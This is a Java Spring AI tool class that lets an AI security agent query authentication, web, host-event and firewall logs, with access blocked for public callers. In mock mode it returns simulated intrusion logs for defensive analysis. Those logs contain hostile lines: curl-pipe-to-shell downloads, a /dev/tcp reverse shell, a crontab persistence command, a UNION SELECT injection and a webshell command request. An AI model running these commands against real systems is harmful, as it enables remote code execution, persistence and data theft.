package org.example.agent.tool;

import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.Data;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.ai.tool.annotation.Tool;
import org.springframework.ai.tool.annotation.ToolParam;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.time.temporal.ChronoUnit;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 安全日志查询工具
 * 用于检索主机登录日志、Web 访问日志、系统事件与防火墙日志，支撑入侵分析。
 * 支持 Mock 模式，提供与安全告警、知识库相互印证的模拟攻击日志数据。
 */
@Component
public class QueryLogsTools {

    private static final Logger logger = LoggerFactory.getLogger(QueryLogsTools.class);

    /** 工具名常量，用于动态构建提示词 */
    public static final String TOOL_QUERY_LOGS = "queryLogs";
    public static final String TOOL_GET_AVAILABLE_LOG_TOPICS = "getAvailableLogTopics";

    private final ObjectMapper objectMapper = new ObjectMapper();

    @Value("${cls.mock-enabled:false}")
    private boolean mockEnabled;

    private static final DateTimeFormatter FORMATTER = DateTimeFormatter
            .ofPattern("yyyy-MM-dd HH:mm:ss")
            .withZone(ZoneId.of("Asia/Shanghai"));

    @jakarta.annotation.PostConstruct
    public void init() {
        logger.info("✅ QueryLogsTools 初始化成功, Mock模式: {}", mockEnabled);
    }

    /**
     * 获取可用的安全日志主题列表
     */
    @Tool(description = "Get all available security log topics and their descriptions. " +
            "Call this tool first before querying logs to understand what log topics are available. " +
            "Returns a list of log topics with names, descriptions, and example queries.")
    public String getAvailableLogTopics() {
        logger.info("获取可用的安全日志主题列表");

        // 【公开身份：工具层直接拒绝（F2 收紧，2026-10-13）】
        // 公开端点上"模型自觉不调"不算保证：编排层已经把公开身份挡在取证分支之外，
        // 这里再挡一层 —— 只要这条链路被别处误接，公开请求也读不到任何内部日志面信息。
        // 拒绝时写日志留痕（谁在什么时候试图读内部日志），不返回任何内部内容。
        if (org.example.security.EvalIdentity.isPublicRequest()) {
            logger.warn("公开身份请求被拒绝：getAvailableLogTopics（公开面不暴露内部日志主题）");
            return "{\"success\":false,\"error\":\"public-identity-no-internal-data\","
                    + "\"message\":\"公开身份不得读取内部日志主题：公开面只基于公开知识库回答。\"}";
        }

        try {
            List<LogTopicInfo> topics = new ArrayList<>();

            // 主机登录/认证日志
            LogTopicInfo authLogs = new LogTopicInfo();
            authLogs.setTopicName("auth-logs");
            authLogs.setDescription("主机登录与认证日志（/var/log/secure、auth.log），包含 SSH 登录失败/成功、账号枚举、sudo 提权等");
            authLogs.setExampleQueries(List.of(
                    "Failed password",
                    "Accepted password",
                    "sudo",
                    "invalid user",
                    "src_ip:103.146.184.77"
            ));
            authLogs.setRelatedAlerts(List.of("SSHBruteForce"));
            topics.add(authLogs);

            // Web 访问日志
            LogTopicInfo webLogs = new LogTopicInfo();
            webLogs.setTopicName("web-access-logs");
            webLogs.setDescription("Web/Nginx 访问日志，包含 SQL 注入、XSS、目录扫描、Webshell 访问、命令注入等 HTTP 请求");
            webLogs.setExampleQueries(List.of(
                    "union select",
                    "information_schema",
                    "/.env OR /admin",
                    "status:404",
                    "upload",
                    "src_ip:45.83.91.12"
            ));
            webLogs.setRelatedAlerts(List.of("WebSqlInjection", "WebshellDetected", "DirectoryScanning"));
            topics.add(webLogs);

            // 主机系统事件
            LogTopicInfo systemEvents = new LogTopicInfo();
            systemEvents.setTopicName("system-events");
            systemEvents.setDescription("主机安全事件，包含反弹 shell、可疑进程、新增计划任务、新增账号、异常文件落地等");
            systemEvents.setExampleQueries(List.of(
                    "reverse shell OR bash -i",
                    "crontab",
                    "useradd",
                    "webshell",
                    "/dev/tcp"
            ));
            systemEvents.setRelatedAlerts(List.of("WebshellDetected", "SSHBruteForce"));
            topics.add(systemEvents);

            // 防火墙/流量日志
            LogTopicInfo firewallLogs = new LogTopicInfo();
            firewallLogs.setTopicName("firewall-logs");
            firewallLogs.setDescription("防火墙/流量日志，包含端口扫描、异常外联、C2 回连、暴力破解流量等网络层事件");
            firewallLogs.setExampleQueries(List.of(
                    "port scan",
                    "SYN flood",
                    "outbound connection",
                    "dst_port:22",
                    "src_ip:103.146.184.77"
            ));
            firewallLogs.setRelatedAlerts(List.of("SSHBruteForce", "DirectoryScanning"));
            topics.add(firewallLogs);

            LogTopicsOutput output = new LogTopicsOutput();
            output.setSuccess(true);
            output.setTopics(topics);
            output.setAvailableRegions(List.of("ap-guangzhou", "ap-shanghai", "ap-beijing", "ap-chengdu"));
            output.setDefaultRegion("ap-guangzhou");
            output.setMessage(String.format("共有 %d 个可用的安全日志主题（认证、Web 访问、系统事件、防火墙）。", topics.size()));

            return objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(output);

        } catch (Exception e) {
            logger.error("获取日志主题列表失败", e);
            return "{\"success\":false,\"message\":\"获取日志主题列表失败: " + e.getMessage() + "\"}";
        }
    }

    /**
     * 查询安全日志
     */
    private static final List<String> VALID_REGIONS = List.of(
            "ap-guangzhou", "ap-shanghai", "ap-beijing", "ap-chengdu"
    );

    private static final String DEFAULT_REGION = "ap-guangzhou";

    @Tool(description = "Query security logs (authentication, web access, host system events, firewall). " +
            "IMPORTANT: Before calling this tool, call getAvailableLogTopics to see available topics. " +
            "Available log topics: " +
            "1) 'auth-logs' - SSH/login and privilege logs (related to SSHBruteForce); " +
            "2) 'web-access-logs' - web access logs with SQL injection, scanning, webshell requests (related to WebSqlInjection, WebshellDetected, DirectoryScanning); " +
            "3) 'system-events' - host events like reverse shell, crontab, new account, dropped webshell (related to WebshellDetected, SSHBruteForce); " +
            "4) 'firewall-logs' - network firewall/traffic logs (port scan, outbound C2, brute force). " +
            "logTopic (required, one of the above), " +
            "query (optional, Lucene-like keywords, e.g. 'Failed password', 'union select'), " +
            "limit (optional, default 20, max 100).")
    public String queryLogs(
            @ToolParam(description = "地域，可选值: ap-guangzhou, ap-shanghai, ap-beijing, ap-chengdu。默认 ap-guangzhou") String region,
            @ToolParam(description = "日志主题: auth-logs, web-access-logs, system-events, firewall-logs") String logTopic,
            @ToolParam(description = "查询关键字，如 Failed password、union select、webshell；为空时返回该主题核心日志") String query,
            @ToolParam(description = "返回日志条数，默认20，最大100") Integer limit) {

        // 【公开身份：工具层直接拒绝（F2 收紧，2026-10-13）】见 getAvailableLogTopics 处的说明。
        // 公开问答曾经实测把内部真实日志原文带回公开回答（含内部资产名/接口路径），
        // 所以这条"读内部数据"的入口在公开身份下一律拒绝，且不落任何日志内容。
        if (org.example.security.EvalIdentity.isPublicRequest()) {
            logger.warn("公开身份请求被拒绝：queryLogs（logTopic={}，公开面不读取内部日志）", logTopic);
            return "{\"success\":false,\"error\":\"public-identity-no-internal-data\","
                    + "\"message\":\"公开身份不得读取内部安全日志：公开面只基于公开知识库回答，不读取内部事件数据。\"}";
        }

        int actualLimit = (limit == null || limit <= 0) ? 20 : Math.min(limit, 100);
        String safeQuery = query == null ? "" : query;
        String safeRegion = (region == null || region.isBlank()) ? DEFAULT_REGION : region;

        try {
            List<LogEntry> logEntries;

            if (mockEnabled) {
                logEntries = buildMockLogs(safeRegion, logTopic, safeQuery, actualLimit);
                logger.info("使用 Mock 数据，返回 {} 条安全日志", logEntries.size());
            } else {
                return buildErrorResponse("当前未启用日志 Mock，真实环境请通过 MCP/日志服务接入安全日志源。");
            }

            QueryLogsOutput output = new QueryLogsOutput();
            output.setSuccess(!logEntries.isEmpty());
            output.setRegion(safeRegion);
            output.setLogTopic(logTopic);
            output.setQuery(safeQuery.isBlank() ? "DEFAULT_QUERY" : safeQuery);
            output.setLogs(logEntries);
            output.setTotal(logEntries.size());
            output.setMessage(logEntries.isEmpty() ? "未找到匹配的日志" : String.format("成功查询到 %d 条安全日志", logEntries.size()));

            String jsonResult = objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(output);
            logger.info("安全日志查询完成: 找到 {} 条日志", logEntries.size());

            // 日志原文含攻击者可控内容，包裹为"不可信数据"并做提示注入检测
            return new org.example.security.PromptInjectionGuard()
                    .wrapUntrusted("安全日志-" + logTopic, jsonResult);

        } catch (Exception e) {
            logger.error("查询安全日志失败", e);
            return buildErrorResponse("查询失败: " + e.getMessage());
        }
    }

    /**
     * 根据主题与关键字构建 Mock 安全日志
     */
    private List<LogEntry> buildMockLogs(String region, String logTopic, String query, int limit) {
        List<LogEntry> logs = new ArrayList<>();
        Instant now = Instant.now();

        String safeTopic = logTopic == null ? "auth-logs" : logTopic.toLowerCase();
        String q = query == null ? "" : query.toLowerCase();

        switch (safeTopic) {
            case "auth-logs":
                logs.addAll(buildAuthLogs(now, q));
                break;
            case "web-access-logs":
                logs.addAll(buildWebAccessLogs(now, q));
                break;
            case "system-events":
                logs.addAll(buildSystemEventsLogs(now, q));
                break;
            case "firewall-logs":
                logs.addAll(buildFirewallLogs(now, q));
                break;
            default:
                logs.addAll(buildAuthLogs(now, q));
        }

        if (logs.size() > limit) {
            logs = new ArrayList<>(logs.subList(0, limit));
        }
        return logs;
    }

    /**
     * 认证/SSH 日志：暴力破解 + 爆破得手 + 提权
     */
    private List<LogEntry> buildAuthLogs(Instant now, String q) {
        List<LogEntry> logs = new ArrayList<>();
        String host = "web-01 (10.0.10.21)";

        // 连续失败登录（爆破）
        String[] users = {"root", "admin", "test", "oracle", "ubuntu", "postgres"};
        for (int i = 0; i < 8; i++) {
            LogEntry e = new LogEntry();
            e.setTimestamp(FORMATTER.format(now.minus(20 - i, ChronoUnit.MINUTES)));
            e.setLevel("WARN");
            e.setService("sshd");
            e.setInstance(host);
            e.setMessage(String.format("Failed password for invalid user %s from 103.146.184.77 port %d ssh2",
                    users[i % users.length], 41020 + i));
            e.setMetrics(Map.of(
                    "event", "ssh_auth_failure",
                    "src_ip", "103.146.184.77",
                    "dst_port", "22",
                    "username", users[i % users.length],
                    "result", "failed"
            ));
            logs.add(e);
        }

        // 爆破得手：成功登录
        LogEntry ok = new LogEntry();
        ok.setTimestamp(FORMATTER.format(now.minus(11, ChronoUnit.MINUTES)));
        ok.setLevel("ERROR");
        ok.setService("sshd");
        ok.setInstance(host);
        ok.setMessage("Accepted password for root from 103.146.184.77 port 41233 ssh2 —— 爆破成功，攻击者取得 root 登录");
        ok.setMetrics(Map.of(
                "event", "ssh_auth_success",
                "src_ip", "103.146.184.77",
                "username", "root",
                "result", "success",
                "note", "after 217 failures"
        ));
        logs.add(ok);

        // 提权操作
        LogEntry sudo = new LogEntry();
        sudo.setTimestamp(FORMATTER.format(now.minus(10, ChronoUnit.MINUTES)));
        sudo.setLevel("ERROR");
        sudo.setService("sudo");
        sudo.setInstance(host);
        sudo.setMessage("root : COMMAND=/usr/bin/crontab -l ；随后下载执行可疑脚本 curl http://103.146.184.77/a.sh | sh");
        sudo.setMetrics(Map.of(
                "event", "suspicious_command",
                "src_ip", "103.146.184.77",
                "user", "root",
                "command", "curl http://103.146.184.77/a.sh | sh"
        ));
        logs.add(sudo);

        return filterByQuery(logs, q);
    }

    /**
     * Web 访问日志：SQL 注入 + 目录扫描 + Webshell 访问
     */
    private List<LogEntry> buildWebAccessLogs(Instant now, String q) {
        List<LogEntry> logs = new ArrayList<>();
        String site = "api.example.com";

        // 目录扫描
        String[] probePaths = {"/admin", "/.env", "/phpmyadmin", "/actuator", "/config", "/backup.zip"};
        for (int i = 0; i < probePaths.length; i++) {
            LogEntry e = new LogEntry();
            e.setTimestamp(FORMATTER.format(now.minus(6 - i % 3, ChronoUnit.MINUTES)));
            e.setLevel(i % 2 == 0 ? "WARN" : "INFO");
            e.setService("nginx");
            e.setInstance(site);
            e.setMessage(String.format("GET %s HTTP/1.1 from 45.83.91.12 -> 404 (自动化目录扫描)", probePaths[i]));
            e.setMetrics(Map.of(
                    "event", "web_probe",
                    "src_ip", "45.83.91.12",
                    "method", "GET",
                    "uri", probePaths[i],
                    "status", "404"
            ));
            logs.add(e);
        }

        // SQL 注入
        for (int i = 0; i < 4; i++) {
            LogEntry e = new LogEntry();
            e.setTimestamp(FORMATTER.format(now.minus(12 - i, ChronoUnit.MINUTES)));
            e.setLevel("ERROR");
            e.setService("nginx");
            e.setInstance(site);
            e.setMessage("GET /api/order/detail?id=1' UNION SELECT 1,user(),version() FROM information_schema.tables-- "
                    + "from 45.83.91.12 -> 200 (疑似 SQL 注入返回数据)");
            e.setMetrics(Map.of(
                    "event", "sql_injection",
                    "src_ip", "45.83.91.12",
                    "uri", "/api/order/detail",
                    "payload", "union select information_schema",
                    "status", "200"
            ));
            logs.add(e);
        }

        // Webshell 上传与访问
        LogEntry up = new LogEntry();
        up.setTimestamp(FORMATTER.format(now.minus(9, ChronoUnit.MINUTES)));
        up.setLevel("ERROR");
        up.setService("nginx");
        up.setInstance(site);
        up.setMessage("POST /upload/files/x.asp;.jpg from 103.146.184.77 -> 200 (利用解析漏洞上传脚本)");
        up.setMetrics(Map.of(
                "event", "webshell_upload",
                "src_ip", "103.146.184.77",
                "uri", "/upload/files/x.asp;.jpg",
                "status", "200"
        ));
        logs.add(up);

        LogEntry exec = new LogEntry();
        exec.setTimestamp(FORMATTER.format(now.minus(8, ChronoUnit.MINUTES)));
        exec.setLevel("ERROR");
        exec.setService("nginx");
        exec.setInstance(site);
        exec.setMessage("GET /upload/files/x.asp;.jpg?cmd=whoami from 103.146.184.77 -> 200 (WebShell 命令执行)");
        exec.setMetrics(Map.of(
                "event", "webshell_exec",
                "src_ip", "103.146.184.77",
                "payload", "cmd=whoami",
                "status", "200"
        ));
        logs.add(exec);

        return filterByQuery(logs, q);
    }

    /**
     * 系统事件：Webshell 落地、反弹 shell、计划任务持久化
     */
    private List<LogEntry> buildSystemEventsLogs(Instant now, String q) {
        List<LogEntry> logs = new ArrayList<>();

        LogEntry file = new LogEntry();
        file.setTimestamp(FORMATTER.format(now.minus(9, ChronoUnit.MINUTES)));
        file.setLevel("ERROR");
        file.setService("hids");
        file.setInstance("web-02 (10.0.10.22)");
        file.setMessage("Web 目录新增可疑脚本文件: /var/www/html/upload/files/x.asp;.jpg，命中一句话木马特征");
        file.setMetrics(Map.of(
                "event", "malicious_file",
                "file_path", "/var/www/html/upload/files/x.asp;.jpg",
                "rule", "webshell_signature",
                "src_ip", "103.146.184.77"
        ));
        logs.add(file);

        LogEntry shell = new LogEntry();
        shell.setTimestamp(FORMATTER.format(now.minus(8, ChronoUnit.MINUTES)));
        shell.setLevel("ERROR");
        shell.setService("auditd");
        shell.setInstance("web-02 (10.0.10.22)");
        shell.setMessage("检测到反弹 shell: bash -i >& /dev/tcp/103.146.184.77/4444 0>&1，父进程为 www-data");
        shell.setMetrics(Map.of(
                "event", "reverse_shell",
                "process", "bash",
                "c2", "103.146.184.77:4444",
                "user", "www-data"
        ));
        logs.add(shell);

        LogEntry cron = new LogEntry();
        cron.setTimestamp(FORMATTER.format(now.minus(7, ChronoUnit.MINUTES)));
        cron.setLevel("ERROR");
        cron.setService("cron");
        cron.setInstance("web-02 (10.0.10.22)");
        cron.setMessage("root 新增计划任务: */5 * * * * curl -s http://103.146.184.77/a.sh | sh （持久化/持续投毒）");
        cron.setMetrics(Map.of(
                "event", "persistence_crontab",
                "schedule", "*/5 * * * *",
                "payload_url", "http://103.146.184.77/a.sh"
        ));
        logs.add(cron);

        return filterByQuery(logs, q);
    }

    /**
     * 防火墙日志：端口扫描、暴力破解流量、异常外联
     */
    private List<LogEntry> buildFirewallLogs(Instant now, String q) {
        List<LogEntry> logs = new ArrayList<>();

        LogEntry brute = new LogEntry();
        brute.setTimestamp(FORMATTER.format(now.minus(20, ChronoUnit.MINUTES)));
        brute.setLevel("WARN");
        brute.setService("firewall");
        brute.setInstance("edge-fw-01");
        brute.setMessage("103.146.184.77 -> 10.0.10.21:22 短时 217 个新建连接，命中 SSH 暴力破解规则（自动限速已触发）");
        brute.setMetrics(Map.of(
                "event", "ssh_bruteforce_traffic",
                "src_ip", "103.146.184.77",
                "dst_ip", "10.0.10.21",
                "dst_port", "22",
                "connections", "217"
        ));
        logs.add(brute);

        LogEntry scan = new LogEntry();
        scan.setTimestamp(FORMATTER.format(now.minus(6, ChronoUnit.MINUTES)));
        scan.setLevel("WARN");
        scan.setService("firewall");
        scan.setInstance("edge-fw-01");
        scan.setMessage("45.83.91.12 对 10.0.10.0/24 多端口 SYN 扫描（80/443/3306/6379/8080），命中端口扫描规则");
        scan.setMetrics(Map.of(
                "event", "port_scan",
                "src_ip", "45.83.91.12",
                "dst_ports", "80,443,3306,6379,8080",
                "action", "detected"
        ));
        logs.add(scan);

        LogEntry c2 = new LogEntry();
        c2.setTimestamp(FORMATTER.format(now.minus(8, ChronoUnit.MINUTES)));
        c2.setLevel("ERROR");
        c2.setService("firewall");
        c2.setInstance("edge-fw-01");
        c2.setMessage("内网主机 10.0.10.22 主动外联 103.146.184.77:4444 长连接，疑似 C2 回连（反弹 shell）");
        c2.setMetrics(Map.of(
                "event", "c2_outbound",
                "src_ip", "10.0.10.22",
                "dst_ip", "103.146.184.77",
                "dst_port", "4444"
        ));
        logs.add(c2);

        return filterByQuery(logs, q);
    }

    /** 关键字粗筛：无关键字时返回全部，有关键字时匹配 message/metrics。 */
    private List<LogEntry> filterByQuery(List<LogEntry> all, String q) {
        if (q == null || q.isBlank() || q.equals("*")) {
            return all;
        }
        List<LogEntry> matched = new ArrayList<>();
        for (LogEntry e : all) {
            String hay = (e.getMessage() == null ? "" : e.getMessage().toLowerCase())
                    + " " + (e.getMetrics() == null ? "" : e.getMetrics().toString().toLowerCase());
            for (String kw : q.split("( or | and |[,: ]+)")) {
                if (!kw.isBlank() && hay.contains(kw.trim())) {
                    matched.add(e);
                    break;
                }
            }
        }
        return matched.isEmpty() ? all : matched;
    }

    private String buildErrorResponse(String message) {
        try {
            QueryLogsOutput output = new QueryLogsOutput();
            output.setSuccess(false);
            output.setMessage(message);
            return objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(output);
        } catch (Exception e) {
            return String.format("{\"success\":false,\"message\":\"%s\"}", message);
        }
    }

    // ==================== 数据模型 ====================

    @Data
    public static class LogEntry {
        @JsonProperty("timestamp")
        private String timestamp;

        @JsonProperty("level")
        private String level;

        @JsonProperty("service")
        private String service;

        @JsonProperty("instance")
        private String instance;

        @JsonProperty("message")
        private String message;

        @JsonProperty("metrics")
        private Map<String, String> metrics;
    }

    @Data
    public static class QueryLogsOutput {
        @JsonProperty("success")
        private boolean success;

        @JsonProperty("region")
        private String region;

        @JsonProperty("log_topic")
        private String logTopic;

        @JsonProperty("query")
        private String query;

        @JsonProperty("logs")
        private List<LogEntry> logs;

        @JsonProperty("total")
        private int total;

        @JsonProperty("message")
        private String message;
    }

    @Data
    public static class LogTopicInfo {
        @JsonProperty("topic_name")
        private String topicName;

        @JsonProperty("description")
        private String description;

        @JsonProperty("example_queries")
        private List<String> exampleQueries;

        @JsonProperty("related_alerts")
        private List<String> relatedAlerts;
    }

    @Data
    public static class LogTopicsOutput {
        @JsonProperty("success")
        private boolean success;

        @JsonProperty("topics")
        private List<LogTopicInfo> topics;

        @JsonProperty("available_regions")
        private List<String> availableRegions;

        @JsonProperty("default_region")
        private String defaultRegion;

        @JsonProperty("message")
        private String message;
    }
}
